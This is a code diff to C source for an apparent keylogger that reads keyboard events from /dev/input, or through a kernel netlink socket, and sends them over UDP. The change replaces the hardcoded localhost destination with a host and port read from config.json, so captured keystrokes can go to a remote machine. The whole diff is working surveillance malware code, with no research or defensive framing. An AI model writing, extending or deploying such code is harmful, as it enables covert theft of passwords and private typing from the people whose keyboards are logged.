@@ -32,6 +32,8 @@
 #include <arpa/inet.h>
 #endif
 
+#include <config.h>
+
 #define NETLINK_USER 31
 #define MAX_PAYLOAD 1024
 #define PORT 8888
@@ -123,7 +125,7 @@ MODULE_DESCRIPTION("Keyboard Module");
 char* find_keyboard_device() {
     DIR *dir;
     struct dirent *ent;
-    char path[256];
+    char path[267];
     char *device_path = NULL;
     
     dir = opendir("/dev/input");
@@ -169,6 +171,12 @@ void handle_kernel_input(void) {
     int sock_fd, udp_fd;
     struct input_event *ev;
     struct sockaddr_in udp_addr;
+    const config_t *cfg;
+
+    if (load_config("config.json") < 0) {
+        fprintf(stderr, "Using default configuration\n");
+    }
+    cfg = get_config();
 
     sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_USER);
     if (sock_fd < 0) {
@@ -185,8 +193,8 @@ void handle_kernel_input(void) {
 
     memset(&udp_addr, 0, sizeof(udp_addr));
     udp_addr.sin_family = AF_INET;
-    udp_addr.sin_port = htons(PORT);
-    udp_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    udp_addr.sin_port = htons(cfg->port ? cfg->port : DEFAULT_PORT);
+    udp_addr.sin_addr.s_addr = inet_addr(cfg->host[0] ? cfg->host : DEFAULT_HOST);
 
     memset(&src_addr, 0, sizeof(src_addr));
     src_addr.nl_family = AF_NETLINK;
@@ -249,6 +257,12 @@ void handle_userspace_input(const char *device_path) {
     int fd, udp_fd;
     struct input_event ev;
     struct sockaddr_in udp_addr;
+    const config_t *cfg;
+
+    if (load_config("config.json") < 0) {
+        fprintf(stderr, "Using default configuration\n");
+    }
+    cfg = get_config();
 
     fd = open(device_path, O_RDONLY);
     if (fd < 0) {
@@ -265,8 +279,8 @@ void handle_userspace_input(const char *device_path) {
 
     memset(&udp_addr, 0, sizeof(udp_addr));
     udp_addr.sin_family = AF_INET;
-    udp_addr.sin_port = htons(PORT);
-    udp_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    udp_addr.sin_port = htons(cfg->port ? cfg->port : DEFAULT_PORT);
+    udp_addr.sin_addr.s_addr = inet_addr(cfg->host[0] ? cfg->host : DEFAULT_HOST);
 
     printf("Userspace mode keylogger started on device: %s\nPress CTRL+C to terminate.\n", device_path);
 
